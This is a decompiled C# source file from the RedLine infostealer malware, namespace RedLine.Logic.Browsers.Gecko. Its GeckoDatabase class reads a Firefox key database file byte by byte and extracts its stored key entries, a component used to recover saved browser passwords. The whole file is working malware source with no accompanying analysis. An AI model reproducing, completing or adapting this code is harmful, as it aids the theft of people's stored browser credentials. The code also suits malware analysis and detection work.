using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace RedLine.Logic.Browsers.Gecko
{
	// Token: 0x02000068 RID: 104
	public class GeckoDatabase
	{
		// Token: 0x170000C7 RID: 199
		// (get) Token: 0x060002C3 RID: 707 RVA: 0x0000C5B2 File Offset: 0x0000A7B2
		public List<KeyValuePair<string, string>> Keys { get; }

		// Token: 0x060002C4 RID: 708 RVA: 0x0000C5BC File Offset: 0x0000A7BC
		public GeckoDatabase(string FileName)
		{
			List<byte> list = new List<byte>();
			this.Keys = new List<KeyValuePair<string, string>>();
			list.AddRange(File.ReadAllBytes(FileName));
			string value = BitConverter.ToString(this.Calculate(list.ToArray(), 0, 4, false)).Replace("-", "");
			BitConverter.ToString(this.Calculate(list.ToArray(), 4, 4, false)).Replace("-", "");
			int num = BitConverter.ToInt32(this.Calculate(list.ToArray(), 12, 4, true), 0);
			if (!string.IsNullOrEmpty(value))
			{
				int num2 = int.Parse(BitConverter.ToString(this.Calculate(list.ToArray(), 56, 4, false)).Replace("-", ""));
				int num3 = 1;
				while (this.Keys.Count < num2)
				{
					string[] array = new string[(num2 - this.Keys.Count) * 2];
					for (int i = 0; i < (num2 - this.Keys.Count) * 2; i++)
					{
						array[i] = BitConverter.ToString(this.Calculate(list.ToArray(), num * num3 + 2 + i * 2, 2, true)).Replace("-", "");
					}
					Array.Sort<string>(array);
					for (int j = 0; j < array.Length; j += 2)
					{
						int num4 = Convert.ToInt32(array[j], 16) + num * num3;
						int num5 = Convert.ToInt32(array[j + 1], 16) + num * num3;
						int num6 = (j + 2 >= array.Length) ? (num + num * num3) : (Convert.ToInt32(array[j + 2], 16) + num * num3);
						string @string = Encoding.ASCII.GetString(this.Calculate(list.ToArray(), num5, num6 - num5, false));
						string value2 = BitConverter.ToString(this.Calculate(list.ToArray(), num4, num5 - num4, false));
						if (!string.IsNullOrEmpty(@string))
						{
							this.Keys.Add(new KeyValuePair<string, string>(@string, value2));
						}
					}
					num3++;
				}
			}
		}

		// Token: 0x060002C5 RID: 709 RVA: 0x0000C7C4 File Offset: 0x0000A9C4
		private byte[] Calculate(byte[] source, int start, int length, bool littleEndian)
		{
			byte[] array = new byte[length];
			int num = 0;
			for (int i = start; i < start + length; i++)
			{
				array[num] = source[i];
				num++;
			}
			if (littleEndian)
			{
				Array.Reverse(array);
			}
			return array;
		}
	}
}
